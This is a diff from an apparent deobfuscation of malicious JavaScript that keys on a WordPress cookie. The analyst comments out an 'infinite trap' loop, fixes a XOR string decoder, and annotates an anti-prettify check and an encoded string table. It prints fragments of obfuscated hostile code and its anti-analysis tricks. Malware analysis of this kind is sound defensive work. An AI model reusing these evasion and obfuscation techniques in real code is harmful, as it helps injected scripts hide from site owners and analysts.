@@ -68,21 +68,29 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
     var _0x595b5c = function () {
       var _0x5d25f0 = {
         'data': { 'key': 'cookie', 'value': 'timeout' }, 
+        /**
+         * 
+         * @param {Array} _0x3708ac 
+         * @param {*} _0x23dfb3 
+         * @param {*} _0x598f54 
+         * @param {Object} _0x12f5a1 
+         */
         'setCookie': function (_0x3708ac, _0x23dfb3, _0x598f54, _0x12f5a1) {
           _0x12f5a1 = _0x12f5a1 || {};
           var _0x5f403b = _0x23dfb3 + '=' + _0x598f54;
 
           var _0x300863 = 0;
-          for (var _0x300863 = 0, _0x1550d4 = _0x3708ac.length; _0x300863 < _0x1550d4; _0x300863++) {
-            var _0x1a778a = _0x3708ac[_0x300863];
-            _0x5f403b += '; ' + _0x1a778a;
-            var _0x338aad = _0x3708ac[_0x1a778a];
-            _0x3708ac['push'](_0x338aad);
-            _0x1550d4 = _0x3708ac.length;
-            if (_0x338aad !== !![]) {
-              _0x5f403b += '=' + _0x338aad;
-            }
-          } 
+          // Another infinite trap if _0x3708ac has length > 0
+          // for (var _0x300863 = 0, _0x1550d4 = _0x3708ac.length; _0x300863 < _0x1550d4; _0x300863++) {
+          //   var _0x1a778a = _0x3708ac[_0x300863];
+          //   _0x5f403b += '; ' + _0x1a778a;
+          //   var _0x338aad = _0x3708ac[_0x1a778a];
+          //   _0x3708ac['push'](_0x338aad); // pushes a value to the array
+          //   _0x1550d4 = _0x3708ac.length; // also increments the exit condition
+          //   if (_0x338aad !== true) {
+          //     _0x5f403b += '=' + _0x338aad;
+          //   }
+          // } 
           _0x12f5a1['cookie'] = _0x5f403b;
         }, 
         'removeCookie': function () {
@@ -207,7 +215,7 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
           temp = numberArray[x];
           numberArray[x] = numberArray[y];
           numberArray[y] = temp;
-          newString += String.fromCharCode(str.charCodeAt(i) ^ numberArray[(_0x1affc7[_0x17a8d7] + _0x1affc7[y]) % 256]);
+          newString += String.fromCharCode(str1.charCodeAt(i) ^ numberArray[(numberArray[x] + numberArray[y]) % 256]);
         }
 
         return newString;
@@ -235,7 +243,7 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
 
         // This could be checking if the file has been prettified, as prettification would likely add newlines to the function `this['nssEcv']`
         // in the original it's `this['nssEcv']=function(){return'newState';}`, which passes the regex
-        var _0x42fc30 = _0x2112f8['test'](this['nssEcv']['toString']()) ? 
+        var _0x42fc30 = _0x2112f8.test(this['nssEcv']['toString']()) ? 
           --this['LhXTbG'][0x1] : // intended path
           --this['LhXTbG'][0];  // prettified path
 
@@ -426,7 +434,7 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
     _0x55dc('0x1c', 'ouTR'),  // 0, 0x00 : 
     _0x55dc('0x1d', 'pQwL'),  // 1, 0x01
     '//',                     // 2, 0x02
-    _0x55dc('0x1e', '7Gn)'),  // 3
+    _0x55dc('0x1e', '7Gn)'),  // 3, 0x03 : 
     _0x55dc('0x1f', 'hbB#'),  // 4
     _0x55dc('0x20', 'VWn3'),
     _0x55dc('0x21', 'P[RT'),
@@ -438,7 +446,7 @@ if (document.cookie.indexOf('wp-settings-time') !== -1) {
     _0x55dc('0x27', 'WKAi'),  //12
     _0x55dc('0x28', '57NI'),
     _0x55dc('0x29', 'l5iB'),  //14
-    _0x55dc('0x2a', 'Qjwy'),  //15, 0x0f : 
+    _0x55dc('0x2a', 'Qjwy'),  //15, 0x0f : ??? (this is the action the second request performs)
     _0x55dc('0x2b', '7HUU'),  //16, 0x10 : 
     _0x55dc('0x2c', 'E(Sy'),  //17, 0x11
     _0x55dc('0x2d', '5N7U'),  //18
